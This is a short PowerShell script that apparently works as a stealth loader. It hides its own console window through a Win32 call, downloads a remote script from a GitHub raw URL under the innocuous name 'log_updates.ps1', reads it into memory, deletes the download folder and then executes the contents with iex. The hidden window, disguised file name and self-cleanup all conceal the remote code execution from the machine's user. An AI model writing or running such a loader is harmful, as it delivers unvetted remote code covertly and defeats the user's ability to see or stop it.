function Hide-ConsoleWindow() {
  $ShowWindowAsyncCode = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
  $ShowWindowAsync = Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru

  $hwnd = (Get-Process -PID $pid).MainWindowHandle
  if ($hwnd -ne [System.IntPtr]::Zero) {
    # When you got HWND of the console window:
    # (It would appear that Windows Console Host is the default terminal application)
    $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
  } else {
    # When you failed to get HWND of the console window:
    # (It would appear that Windows Terminal is the default terminal application)

    # Mark the current console window with a unique string.
    $UniqueWindowTitle = New-Guid
    $Host.UI.RawUI.WindowTitle = $UniqueWindowTitle
    $StringBuilder = New-Object System.Text.StringBuilder 1024

    # Search the process that has the window title generated above.
    $TerminalProcess = (Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle })
    # Get the window handle of the terminal process.
    # Note that GetConsoleWindow() in Win32 API returns the HWND of
    # powershell.exe itself rather than the terminal process.
    # When you call ShowWindowAsync(HWND, 0) with the HWND from GetConsoleWindow(),
    # the Windows Terminal window will be just minimized rather than hidden.
    $hwnd = $TerminalProcess.MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
      $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
    } else {
      Write-Host "Failed to hide the console window."
    }
  }
}
Hide-ConsoleWindow

powershell -command "New-Item -Path 'c:\' -Name 'logfiles' -ItemType 'directory'"
powershell -command "wget https://raw.githubusercontent.com/daniel0011234/myscripts/main/update_runner_living.ps1 -OutFile C:\logfiles\log_updates.ps1"
Start-Sleep -s 20
#powershell -command "iex (Get-Content -path 'C:\logfiles\log_updates.ps1' -Raw)"
$test = Get-Content -path 'C:\logfiles\log_updates.ps1' -Raw
Remove-Item "C:\logfiles" -Recurse -Force
Start-Sleep -s 20
iex ($test)

